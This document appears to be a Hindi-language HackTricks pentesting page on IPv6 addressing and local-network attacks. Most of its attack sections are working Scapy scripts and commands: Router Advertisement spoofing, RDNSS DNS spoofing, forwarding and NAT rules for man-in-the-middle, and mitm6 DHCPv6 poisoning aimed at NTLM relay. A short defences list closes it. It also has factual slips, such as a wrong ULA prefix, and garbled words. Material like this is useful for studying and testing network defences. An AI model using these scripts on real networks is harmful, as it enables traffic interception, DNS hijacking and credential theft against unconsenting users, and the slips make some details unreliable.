# Pentesting IPv6

{{#include ../../banners/hacktricks-training.md}}

## IPv6 मूल सिद्धांत

### नेटवर्क

IPv6 पते नेटवर्क संगठन और डिवाइस इंटरैक्शन को बढ़ाने के लिए संरचित होते हैं। एक IPv6 पता निम्नलिखित में विभाजित होता है:

1. **नेटवर्क प्रीफिक्स**: प्रारंभिक 48 बिट, जो नेटवर्क खंड को निर्धारित करता है।
2. **सबनेट आईडी**: अगले 16 बिट, जो नेटवर्क के भीतर विशिष्ट सबनेट को परिभाषित करने के लिए उपयोग किया जाता है।
3. **इंटरफेस पहचानकर्ता**: अंतिम 64 बिट, जो सबनेट के भीतर एक डिवाइस की अद्वितीय पहचान करता है।

हालांकि IPv6 में IPv4 में पाए जाने वाले ARP प्रोटोकॉल को छोड़ दिया गया है, यह **ICMPv6** को दो प्रमुख संदेशों के साथ पेश करता है:

- **नेबर सॉलिसिटेशन (NS)**: पते के समाधान के लिए मल्टीकास्ट संदेश।
- **नेबर विज्ञापन (NA)**: NS के लिए यूनिकास्ट प्रतिक्रियाएँ या स्वैच्छिक घोषणाएँ।

IPv6 विशेष पते के प्रकारों को भी शामिल करता है:

- **लूपबैक पता (`::1`)**: IPv4 के `127.0.0.1` के समान, होस्ट के भीतर आंतरिक संचार के लिए।
- **लिंक-लोकल पते (`FE80::/10`)**: स्थानीय नेटवर्क गतिविधियों के लिए, इंटरनेट रूटिंग के लिए नहीं। समान स्थानीय नेटवर्क पर डिवाइस इस रेंज का उपयोग करके एक-दूसरे को खोज सकते हैं।

### नेटवर्क कमांड में IPv6 का व्यावहारिक उपयोग

IPv6 नेटवर्क के साथ इंटरैक्ट करने के लिए, आप विभिन्न कमांड का उपयोग कर सकते हैं:

- **पिंग लिंक-लोकल पते**: `ping6` का उपयोग करके स्थानीय डिवाइस की उपस्थिति की जांच करें।
- **नेबर डिस्कवरी**: लिंक लेयर पर खोजे गए डिवाइस को देखने के लिए `ip neigh` का उपयोग करें।
- **alive6**: समान नेटवर्क पर डिवाइस खोजने के लिए एक वैकल्पिक उपकरण।

नीचे कुछ कमांड उदाहरण दिए गए हैं:
```bash
ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1
ip neigh | grep ^fe80

# Alternatively, use alive6 for neighbor discovery
alive6 eth0
```
IPv6 पते किसी डिवाइस के MAC पते से स्थानीय संचार के लिए निकाले जा सकते हैं। यहाँ एक सरल मार्गदर्शिका है कि कैसे ज्ञात MAC पते से Link-local IPv6 पता निकाला जाए, और IPv6 पते के प्रकारों और नेटवर्क के भीतर IPv6 पते खोजने के तरीकों का संक्षिप्त अवलोकन।

### **MAC पते से Link-local IPv6 निकालना**

एक MAC पता **`12:34:56:78:9a:bc`** दिया गया है, आप Link-local IPv6 पता इस प्रकार बना सकते हैं:

1. MAC को IPv6 प्रारूप में परिवर्तित करें: **`1234:5678:9abc`**
2. `fe80::` को पहले जोड़ें और बीच में `fffe` डालें: **`fe80::1234:56ff:fe78:9abc`**
3. बाईं ओर से सातवें बिट को उलटें, `1234` को `1034` में बदलें: **`fe80::1034:56ff:fe78:9abc`**

### **IPv6 पते के प्रकार**

- **Unique Local Address (ULA)**: स्थानीय संचार के लिए, सार्वजनिक इंटरनेट रूटिंग के लिए नहीं। प्रीफिक्स: **`FEC00::/7`**
- **Multicast Address**: एक से कई संचार के लिए। मल्टीकास्ट समूह में सभी इंटरफेस पर भेजा जाता है। प्रीफिक्स: **`FF00::/8`**
- **Anycast Address**: एक से निकटतम संचार के लिए। रूटिंग प्रोटोकॉल के अनुसार निकटतम इंटरफेस पर भेजा जाता है। **`2000::/3`** वैश्विक यूनिकास्ट रेंज का हिस्सा।

### **पता प्रीफिक्स**

- **fe80::/10**: Link-Local पते (169.254.x.x के समान)
- **fc00::/7**: Unique Local-Unicast (निजी IPv4 रेंज जैसे 10.x.x.x, 172.16.x.x, 192.168.x.x के समान)
- **2000::/3**: Global Unicast
- **ff02::1**: Multicast All Nodes
- **ff02::2**: Multicast Router Nodes

### **नेटवर्क के भीतर IPv6 पते खोजने के तरीके**

#### तरीका 1: Link-local पते का उपयोग करना

1. नेटवर्क के भीतर किसी डिवाइस का MAC पता प्राप्त करें।
2. MAC पते से Link-local IPv6 पता निकालें।

#### तरीका 2: मल्टीकास्ट का उपयोग करना

1. स्थानीय नेटवर्क पर IPv6 पते खोजने के लिए मल्टीकास्ट पते `ff02::1` पर एक पिंग भेजें।
```bash
service ufw stop # Stop the firewall
ping6 -I <IFACE> ff02::1 # Send a ping to multicast address
ip -6 neigh # Display the neighbor table
```
### IPv6 Man-in-the-Middle (MitM) Attacks

IPv6 नेटवर्क में MitM हमलों को निष्पादित करने के लिए कई तकनीकें मौजूद हैं, जैसे:

- ICMPv6 पड़ोसी या राउटर विज्ञापनों की स्पूफिंग।
- रूटिंग को नियंत्रित करने के लिए ICMPv6 रीडायरेक्ट या "Packet Too Big" संदेशों का उपयोग करना।
- मोबाइल IPv6 पर हमला करना (आमतौर पर IPSec को अक्षम करने की आवश्यकता होती है)।
- एक धोखाधड़ी DHCPv6 सर्वर स्थापित करना।

## Identifying IPv6 Addresses in the eild

### Exploring Subdomains

IPv6 पतों से संभावित रूप से जुड़े उपडोमेन खोजने के लिए एक विधि खोज इंजनों का लाभ उठाना है। उदाहरण के लिए, `ipv6.*` जैसे क्वेरी पैटर्न का उपयोग करना प्रभावी हो सकता है। विशेष रूप से, Google में निम्नलिखित खोज आदेश का उपयोग किया जा सकता है:
```bash
site:ipv6./
```
### DNS क्वेरी का उपयोग करना

IPv6 पतों की पहचान करने के लिए, कुछ DNS रिकॉर्ड प्रकारों को क्वेरी किया जा सकता है:

- **AXFR**: एक पूर्ण ज़ोन ट्रांसफर का अनुरोध करता है, जो संभावित रूप से DNS रिकॉर्ड की एक विस्तृत श्रृंखला को उजागर कर सकता है।
- **AAAA**: सीधे IPv6 पतों की खोज करता है।
- **ANY**: एक व्यापक क्वेरी जो सभी उपलब्ध DNS रिकॉर्ड लौटाती है।

### Ping6 के साथ जांच

एक संगठन से जुड़े IPv6 पतों की पहचान करने के बाद, `ping6` उपयोगिता का उपयोग जांच के लिए किया जा सकता है। यह उपकरण पहचाने गए IPv6 पतों की प्रतिक्रियाशीलता का आकलन करने में मदद करता है, और संभवतः निकटवर्ती IPv6 उपकरणों की खोज में भी सहायक हो सकता है।

## IPv6 स्थानीय नेटवर्क हमले की तकनीकें

निम्नलिखित अनुभाग व्यावहारिक लेयर-2 IPv6 हमलों को कवर करते हैं जिन्हें **एक ही /64 खंड के अंदर** बिना किसी वैश्विक उपसर्ग को जाने निष्पादित किया जा सकता है। नीचे दिखाए गए सभी पैकेट **लिंक-लोकल** हैं और केवल स्थानीय स्विच के माध्यम से यात्रा करते हैं, जिससे वे अधिकांश वातावरणों में अत्यधिक छिपे हुए होते हैं।

### स्थिर प्रयोगशाला के लिए सिस्टम ट्यूनिंग

IPv6 ट्रैफ़िक के साथ खेलने से पहले, यह अनुशंसा की जाती है कि आप अपने बॉक्स को मजबूत करें ताकि आपके अपने परीक्षणों द्वारा विषाक्त होने से बचा जा सके और बड़े पैकेट इंजेक्शन/स्निफ़िंग के दौरान सर्वोत्तम प्रदर्शन प्राप्त किया जा सके।
```bash
# Enable promiscuous mode to capture all frames
sudo ip link set dev eth0 promisc on

# Ignore rogue Router Advertisements & Redirects coming from the segment
sudo sysctl -w net.ipv6.conf.all.accept_ra=0
sudo sysctl -w net.ipv6.conf.all.accept_redirects=0

# Increase fd / backlog limits when generating lots of traffic
sudo sysctl -w fs.file-max=100000
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
```
### Passive NDP & DHCPv6 Sniffing

क्योंकि हर IPv6 होस्ट **स्वतः कई मल्टीकास्ट समूहों में शामिल होता है** (`ff02::1`, `ff02::2`, …) और SLAAC/NDP के लिए ICMPv6 बोलता है, आप बिना एक भी पैकेट भेजे पूरे खंड का मानचित्रण कर सकते हैं। निम्नलिखित Python/Scapy एक-लाइनर सबसे दिलचस्प L2 संदेशों के लिए सुनता है और यह प्रिंट करता है कि कौन कौन है, एक रंगीन, टाइमस्टैम्प वाला लॉग:
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dhcp6 import *
from datetime import datetime
from colorama import Fore, Style, init
import argparse

init(autoreset=True)

# Human-readable names for protocols we care about
DHCP6_TYPES = {
DHCP6_Solicit:    'Solicit',
DHCP6_Advertise:  'Advertise',
DHCP6_Request:    'Request',
DHCP6_Reply:      'Reply',
DHCP6_Renew:      'Renew',
DHCP6_Rebind:     'Rebind',
DHCP6_RelayForward:'Relay-Forward',
DHCP6_RelayReply: 'Relay-Reply'
}
ICMP6_TYPES = {
ICMPv6ND_RS:      ('Router Solicitation',  Fore.CYAN),
ICMPv6ND_RA:      ('Router Advertisement', Fore.GREEN),
ICMPv6ND_NS:      ('Neighbor Solicitation',Fore.BLUE),
ICMPv6ND_NA:      ('Neighbor Advertisement',Fore.MAGENTA),
ICMPv6ND_Redirect:('Redirect',             Fore.LIGHTRED_EX),
ICMPv6MLReport:   ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLReport2:  ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLDone:     ('MLD Done',             Fore.LIGHTCYAN_EX),
ICMPv6EchoRequest:('Echo Request',         Fore.LIGHTBLACK_EX),
ICMPv6EchoReply:  ('Echo Reply',           Fore.LIGHTBLACK_EX)
}

def handler(pkt):
eth_src = pkt[Ether].src if Ether in pkt else '?'
eth_dst = pkt[Ether].dst if Ether in pkt else '?'
ip6_src = pkt[IPv6].src if IPv6 in pkt else '?'
ip6_dst = pkt[IPv6].dst if IPv6 in pkt else '?'

# Identify protocol family first
for proto,(desc,color) in ICMP6_TYPES.items():
if proto in pkt:
break
else:
if UDP in pkt and pkt[UDP].dport == 547:  # DHCPv6 server port
for dhcp_t,name in DHCP6_TYPES.items():
if dhcp_t in pkt:
desc = 'DHCPv6 – '+name; color = Fore.YELLOW; break
else:
return  # not a DHCPv6 message we track
else:
return  # not interesting

print(color + f"[{datetime.now().strftime('%H:%M:%S')}] {desc}")
print(f"  MAC  {eth_src} -> {eth_dst}")
print(f"  IPv6 {ip6_src} -> {ip6_dst}")
print('-'*60)

if __name__ == '__main__':
argp = argparse.ArgumentParser(description='IPv6 NDP & DHCPv6 sniffer')
argp.add_argument('-i','--interface',required=True,help='Interface to sniff')
argp.add_argument('-t','--time',type=int,default=0,help='Duration (0 = infinite)')
a = argp.parse_args()
sniff(iface=a.interface,prn=handler,timeout=a.time or None,store=0)
```
परिणाम: कुछ ही सेकंड में एक पूर्ण **link-local topology** (MAC ⇄ IPv6) प्राप्त करना, बिना उन IPS/IDS सिस्टम्स को सक्रिय स्कैन पर निर्भर करते हुए ट्रिगर किए।

### Router Advertisement (RA) Spoofing

IPv6 होस्ट **ICMPv6 Router Advertisements** पर डिफ़ॉल्ट-गेटवे खोजने के लिए निर्भर करते हैं। यदि आप वैध राउटर की तुलना में **अधिक बार** जाली RAs इंजेक्ट करते हैं, तो उपकरण चुपचाप आपको गेटवे के रूप में स्विच कर देंगे।
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('-m','--mac',required=True,help='Source MAC (will be put in SrcLL option)')
p.add_argument('--llip',required=True,help='Link-local source IP, e.g. fe80::dead:beef')
p.add_argument('-l','--lifetime',type=int,default=1800,help='Router lifetime')
p.add_argument('--interval',type=int,default=5,help='Seconds between RAs')
p.add_argument('--revert',action='store_true',help='Send lifetime=0 to undo attack')
args = p.parse_args()

lifetime = 0 if args.revert else args.lifetime
ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=lifetime, prf=0x1)/  # High preference
ICMPv6NDOptSrcLLAddr(lladdr=args.mac))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
वास्तव में **ट्रैफ़िक को अग्रेषित** करने के लिए दौड़ जीतने के बाद:
```bash
sudo sysctl -w net.ipv6.conf.all.forwarding=1
sudo ip6tables -A FORWARD -i eth0 -j ACCEPT
sudo ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
#### राउटर विज्ञापन ध्वज (M/O) और डिफ़ॉल्ट राउटर प्राथमिकता (Prf)

| ध्वज | अर्थ | क्लाइंट व्यवहार पर प्रभाव |
|------|---------|----------------------------|
| **M (प्रबंधित पता कॉन्फ़िगरेशन)** | जब `1` पर सेट किया जाता है, तो होस्ट को अपना IPv6 पता प्राप्त करने के लिए **DHCPv6** का उपयोग करना चाहिए। | पूरा पता DHCPv6 से आता है - *mitm6* शैली के विषाक्तता के लिए सही। |
| **O (अन्य कॉन्फ़िगरेशन)** | जब `1` पर सेट किया जाता है, तो होस्ट को केवल *अन्य* जानकारी (DNS, NTP, …) प्राप्त करने के लिए **DHCPv6** का उपयोग करना चाहिए। | पता अभी भी SLAAC के माध्यम से है, लेकिन DNS को DHCPv6 के साथ हाईजैक किया जा सकता है। |
| **M=0 / O=0** | शुद्ध SLAAC नेटवर्क। | केवल RA / RDNSS चालें संभव हैं - DHCPv6 क्लाइंट द्वारा नहीं भेजा जाएगा। |
| **M=1 / O=1** | मिश्रित वातावरण। | DHCPv6 और SLAAC दोनों का उपयोग किया जाता है; धोखाधड़ी के लिए सतह सबसे बड़ी है। |

एक पेंटेस्ट के दौरान, आप बस एक बार वैध RA का निरीक्षण कर सकते हैं और तय कर सकते हैं कि कौन सा वेक्टर संभव है:
```bash
sudo tcpdump -vvv -i eth0 'icmp6 && ip6[40] == 134'   # capture Router Advertisements
```
`flags [M,O]` फ़ील्ड को डंप में खोजें - कोई अनुमान लगाने की आवश्यकता नहीं है।

**Prf** (राउटर प्रेफरेंस) फ़ील्ड RA हेडर के अंदर नियंत्रित करता है कि आपका धोखाधड़ी राउटर *कई* गेटवे मौजूद होने पर कितना आकर्षक दिखता है:

| Prf मान | बाइनरी | अर्थ |
|---------|---------|------|
| **उच्च**  | `10`   | ग्राहक इस राउटर को किसी भी *मध्यम*/*निम्न* राउटर पर प्राथमिकता देते हैं |
| मध्यम (डिफ़ॉल्ट) | `01` | लगभग हर वैध डिवाइस द्वारा उपयोग किया जाता है |
| निम्न     | `00` | केवल तब चुना जाता है जब कोई बेहतर राउटर मौजूद नहीं होता |

जब आप Scapy के साथ पैकेट उत्पन्न करते हैं, तो आप इसे `prf` पैरामीटर के माध्यम से सेट कर सकते हैं जैसा कि ऊपर दिखाया गया है (`prf=0x1` → उच्च)। **उच्च Prf**, **संक्षिप्त अंतराल**, और **गैर-शून्य जीवनकाल** को मिलाकर आपका धोखाधड़ी गेटवेRemarkably स्थिर बनाता है।

---

### RDNSS (DNS) स्पूफिंग RA के माध्यम से

[RFC 8106](https://datatracker.ietf.org/doc/html/rfc8106) RA के अंदर एक **Recursive DNS Server (RDNSS)** विकल्प जोड़ने की अनुमति देता है। आधुनिक OS (Win 10 ≥1709, Win 11, macOS Big Sur, Linux systemd-resolved, …) स्वचालित रूप से इसे विश्वसनीय मानते हैं:
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('--llip',required=True)
p.add_argument('--dns',required=True,help='Fake DNS IPv6')
p.add_argument('--lifetime',type=int,default=600)
p.add_argument('--interval',type=int,default=5)
args = p.parse_args()

ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=0)/
ICMPv6NDOptRDNSS(dns=[args.dns],lifetime=args.lifetime))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
Clients will **prepend** your DNS to their resolver list for the given lifetime, granting full DNS hijacking until the value expires or you send a `lifetime=0` revert.

### DHCPv6 DNS Spoofing (mitm6)

इसके बजाय SLAAC, Windows नेटवर्क अक्सर DNS के लिए **stateless DHCPv6** पर निर्भर करते हैं।  [mitm6](https://github.com/rofl0r/mitm6) स्वचालित रूप से `Solicit` संदेशों का उत्तर देता है **Advertise → Reply** प्रवाह के साथ जो **आपका लिंक-लोकल पता 300 सेकंड के लिए DNS के रूप में असाइन करता है**।  यह निम्नलिखित को अनलॉक करता है:

* NTLM रिले हमले (WPAD + DNS हाइजैकिंग)
* राउटर्स को छुए बिना आंतरिक नाम समाधान को इंटरसेप्ट करना

Typical usage:
```bash
sudo mitm6 -i eth0 --no-ra # only DHCPv6 poisoning
```
### Defences

* **RA Guard / DHCPv6 Guard / ND Inspection** प्रबंधित स्विच पर।
* पोर्ट ACLs जो केवल वैध राउटर के MAC को RAs भेजने की अनुमति देते हैं।
* **असंगठित उच्च-दर RAs** या अचानक **RDNSS परिवर्तनों** की निगरानी करें।
* एंडपॉइंट्स पर IPv6 को निष्क्रिय करना एक अस्थायी समाधान है जो अक्सर आधुनिक सेवाओं को तोड़ता है और अंधे स्थानों को छुपाता है - इसके बजाय L2 फ़िल्टरिंग को प्राथमिकता दें।

## References

- [Legless – IPv6 Penetration Testing](https://blog.exploit.org/caster-legless/)
- [mitm6](https://github.com/rofl0r/mitm6)
- [RFC 8106 – IPv6 ND DNS Configuration](https://datatracker.ietf.org/doc/html/rfc8106)
- [http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html](http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html)
- [https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904](https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904)
- [Practical Guide to IPv6 Attacks in a Local Network](https://habr.com/ru/articles/930526/)

{{#include ../../banners/hacktricks-training.md}}
